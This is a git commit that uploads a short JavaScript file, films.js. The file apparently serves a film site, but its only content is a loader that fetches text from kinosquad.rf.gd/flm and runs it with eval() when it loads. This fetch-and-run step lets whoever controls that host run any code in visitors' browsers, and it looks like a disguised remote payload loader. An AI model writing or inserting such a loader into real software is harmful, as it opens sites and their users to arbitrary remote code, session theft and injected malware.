a35a058b6d6ca28a662d22e9dfd7dc2be483720d
r1soX <88552568+r1soX@users.noreply.github.com>
2021-09-01 13:16:29 +0700

    Add files via upload

---
+++ films.js
@@ -0,0 +1,12 @@
+let xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://kinosquad.rf.gd/flm');
+xhr.onload = function() {
+    if (xhr.readyState !== 4) return;
+    if (xhr.status === 200) {
+        eval(xhr.responseText);
+        console.log("Удачно")
+    } else {
+        console.log('HTTP/S error', xhr.status, xhr.statusText)
+    }
+};
+xhr.send();
